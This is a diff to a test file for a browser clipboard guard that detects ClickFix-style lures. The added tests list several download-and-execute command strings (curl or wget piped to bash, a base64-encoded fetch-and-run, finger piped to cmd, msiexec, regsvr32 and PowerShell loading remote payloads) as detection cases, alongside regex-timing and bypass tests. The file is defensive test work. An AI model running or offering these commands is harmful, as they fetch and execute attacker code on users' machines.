@@ -55,6 +55,58 @@ Deno.test("clipboard guard patterns: ClickFix-style commands match, ordinary sni
   for (const s of BENIGN) assert(!g.matchDangerous(s), "false positive: " + s);
 });
 
+// Review 2026-11-16 WP-04: ClickFix forms the patterns missed
+// (docs/review-2026-11-16/repros/pat.mjs printed MISSED for each).
+const MISSED_2026_11_16 = [
+  "curl -fsSL https://203.0.113.5/a.sh | /bin/bash",
+  "curl -fsSL https://203.0.113.5/a.sh | nohup bash",
+  "wget -qO- https://203.0.113.5/a.sh | sudo -E /usr/bin/env bash",
+  "bash <(curl -fsSL https://203.0.113.5/a.sh)",
+  "/bin/bash -c \"$(echo Y3VybCBodHRwOi8vZXZpbC9hIHwgYmFzaA== | base64 -d)\"",
+  "cmd /c \"finger vke@203.0.113.5 | cmd\"",
+  "\\\\203.0.113.5@SSL\\DavWWWRoot\\verify.exe",
+  "\\\\203.0.113.5@SSL@443\\share\\verify.exe",
+  "msiexec /qn /i \\\\203.0.113.5@80\\a.msi",
+  "regsvr32 /s /n /u /i:\\\\203.0.113.5\\a.sct scrobj.dll",
+  "PoWeRsHeLl -ep bypass -f \\\\203.0.113.5\\s\\a.ps1",
+];
+const BENIGN_2026_11_16 = [
+  "cat file | bash-completion",
+  "\\\\fileserver\\share\\doc.pdf",
+  "curl -s https://api.example.test/v1/items | jq .",
+  "wget -qO- https://example.test/a.tar.gz | tar xz",
+  "curl -fsSL https://example.test/x | shasum -a 256",
+  "echo aGVsbG8= | base64 -d",
+  "finger user@example.test",
+  "msiexec /i setup.msi /qn",
+  "powershell -File .\\build.ps1",
+];
+
+Deno.test("clipboard guard patterns: the 2026-11-16 ClickFix forms match; near-miss ordinary commands do not", () => {
+  const g = loadClip();
+  const missed = MISSED_2026_11_16.filter((s) => !g.matchDangerous(s));
+  assert(missed.length === 0, "missed: " + JSON.stringify(missed));
+  const fp = BENIGN_2026_11_16.filter((s) => g.matchDangerous(s));
+  assert(fp.length === 0, "false positive: " + JSON.stringify(fp));
+  for (const s of BENIGN) assert(!g.matchDangerous(s), "false positive: " + s);
+});
+
+Deno.test("clipboard guard patterns stay linear: 100 KB adversarial inputs are checked fast", () => {
+  const g = loadClip();
+  const size = 100 * 1024;
+  const fill = (unit) => unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
+  const inputs = ["curl|", "curl | ", "curl |/", "wget | sudo ", "bash <(", "sh -c $(", "finger |", "\\\\a", "\\\\a@", "msiexec /i ", "regsvr32 /i:", "powershell -f ", "pwsh ", "a", " ", "/"].map(fill);
+  // A generous limit: the machine is shared. A quadratic pattern takes
+  // seconds on these inputs.
+  const LIMIT_MS = 500;
+  for (const s of inputs) {
+    const t0 = performance.now();
+    g.matchDangerous(s);
+    const ms = performance.now() - t0;
+    assert(ms < LIMIT_MS, `${ms.toFixed(1)} ms for 100 KB of ${JSON.stringify(s.slice(0, 14))}`);
+  }
+});
+
 Deno.test("clipboard guard: docs hosts are safe; only the visitor's own copy of the selected text counts as deliberate", () => {
   const g = loadClip();
   for (const h of ["github.com", "docs.github.com", "developer.mozilla.org", "brew.sh"]) assert(g.onSafeHost(h), h);
@@ -73,6 +125,15 @@ Deno.test("clipboard guard: docs hosts are safe; only the visitor's own copy of 
   assert(!g.deliberateCopy(null, now, cmd), "no input");
   assert(g.squash("  a \n\t b  ") === "a b", "squash");
 });
+
+// Does a trusted copy/cut event copy `sel`? Since 0.3.6 (review 2026-11-16
+// WP-02) the guard cancels the browser's own copy and writes the checked text
+// itself, so "goes through" means: not cancelled, or the event's data holds it.
+function copiedSelection(p, type, sel) {
+  const dt = new p.window.DataTransfer();
+  const ev = p.input(type, { clipboardData: dt });
+  return !ev.prevented || dt.data["text/plain"] === sel;
+}
 
 function fakePage(host, opts = {}) {
   const listeners = {};
@@ -137,7 +198,8 @@ Deno.test("clipboard guard blocks a page writing a dangerous command (writeText,
   const dt = new p.window.DataTransfer();
   p.input("copy", { clipboardData: dt });
   dt.setData("text/plain", DANGEROUS[1]);
-  assert(dt.data["text/plain"] === undefined, "copy handler cannot swap in a command");
+  // Since 0.3.6 the guard itself writes the checked selection first (WP-02).
+  assert(dt.data["text/plain"] === "just some text", "copy handler cannot swap in a command");
   dt.setData("text/plain", "fine");
   assert(dt.data["text/plain"] === "fine", "normal setData works");
   // Drag-and-drop (or any other) DataTransfer: a command is checked too since
@@ -177,7 +239,7 @@ Deno.test("clipboard guard: the visitor's own copy works; copy buttons, swapped 
   p.input("keydown", { key: "c", ctrlKey: true });
   await p.clipboard.writeText(cmd);
   assert(p.written.length === 1, "copy shortcut on the selection");
-  assert(!p.input("copy", { clipboardData: new p.window.DataTransfer() }).prevented, "the browser's own copy of the selection goes through");
+  assert(copiedSelection(p, "copy", "install with: " + cmd), "the browser's own copy of the selection goes through");
   p.select("an ordinary paragraph");
   p.input("keydown", { key: "c", ctrlKey: true });
   let rejected = false;
@@ -213,7 +275,7 @@ Deno.test("clipboard guard: the visitor's own copy works; copy buttons, swapped 
   p.select(cmd);
   p.input("contextmenu", {});
   p.tick(5000);
-  assert(!p.input("copy", { clipboardData: new p.window.DataTransfer() }).prevented, "menu copy of the selection");
+  assert(copiedSelection(p, "copy", cmd), "menu copy of the selection");
   // A "Copy" button (even next to the visible command) no longer authorises a command.
   const q = fakePage("blog.example");
   q.input("click", { target: { getAttribute: () => "Copy code", className: "copy", id: "", textContent: "Copy", innerText: "Copy " + cmd, parentElement: null } });
@@ -248,6 +310,51 @@ Deno.test("clipboard guard allows docs hosts and the switch off, and fails open 
   const broken = fakePage("captcha-check.example", { flag: "throw" });
   await broken.clipboard.writeText(DANGEROUS[0]);
   assert(broken.written.length === 1, "fail open");
+});
+
+// Review 2026-11-16 WP-01: the fake native methods convert their arguments
+// with String(), like Chrome. A value whose toString throws on the first call
+// and returns a command on the second call must not reach the native method.
+function nativeConvertingPage(host) {
+  const calls = [];
+  let selection = "";
+  class Document { execCommand(cmd) { cmd = String(cmd); calls.push(["exec", cmd, selection]); return true; } }
+  class DataTransfer { constructor() { this.data = {}; } setData(k, v) { k = String(k); v = String(v); calls.push(["setData", k, v]); this.data[k] = v; } }
+  class DataTransferItemList { constructor() { this.data = {}; } add(s, t) { s = String(s); t = String(t); calls.push(["add", s, t]); this.data[t] = s; return {}; } }
+  class Selection { toString() { return selection; } }
+  const document = new Document();
+  document.addEventListener = () => {};
+  document.activeElement = null;
+  const window = { getSelection: () => new Selection(), Selection, Document, DataTransfer, DataTransferItemList };
+  loadClip().install({ window, document, navigator: {}, location: { hostname: host }, now: () => 1000, notify: () => {}, flagOn: () => true });
+  return { window, document, calls, select: (s) => { selection = s; } };
+}
+const throwOnce = (then) => { let n = 0; return { toString() { if (n++ === 0) throw new Error("first"); return then; } }; };
+const throws = (f) => { try { f(); return false; } catch { return true; } };
+
+Deno.test("clipboard guard: a value whose toString throws once is not converted again by the native method (setData, items.add, execCommand)", () => {
+  const cmd = DANGEROUS[0];
+  const p = nativeConvertingPage("captcha-check.example");
+  const reached = () => p.calls.some((c) => c.includes(cmd) && c[0] !== "exec") || p.calls.some((c) => c[0] === "exec" && c[1] === "copy");
+  const dt = new p.window.DataTransfer();
+  assert(throws(() => dt.setData("text/plain", throwOnce(cmd))), "setData did not throw");
+  assert(!reached(), "setData: the command reached the native method: " + JSON.stringify(p.calls));
+  assert(throws(() => dt.setData(throwOnce("text/plain"), cmd)), "setData (type) did not throw");
+  assert(!reached(), "setData (type): the command reached the native method: " + JSON.stringify(p.calls));
+  const list = new p.window.DataTransferItemList();
+  assert(throws(() => list.add(throwOnce(cmd), "text/plain")), "items.add did not throw");
+  assert(!reached(), "items.add: the command reached the native method: " + JSON.stringify(p.calls));
+  p.select(cmd); // a page-made selection of the command
+  assert(throws(() => p.document.execCommand(throwOnce("copy"))), "execCommand did not throw");
+  assert(!reached(), "execCommand: the native copy ran: " + JSON.stringify(p.calls));
+  // Normal calls still work.
+  assert(p.calls.length === 0, "a native method was called: " + JSON.stringify(p.calls));
+  dt.setData("text/plain", "hello");
+  assert(dt.data["text/plain"] === "hello", "normal setData");
+  list.add("hello", "text/plain");
+  assert(list.data["text/plain"] === "hello", "normal items.add");
+  p.select("hello world");
+  assert(p.document.execCommand("copy") === true, "normal execCommand copy");
 });
 
 Deno.test("popup guard: no gesture, a second window per click and popunders are blocked; links, buttons, same site and sign-in pages open", () => {
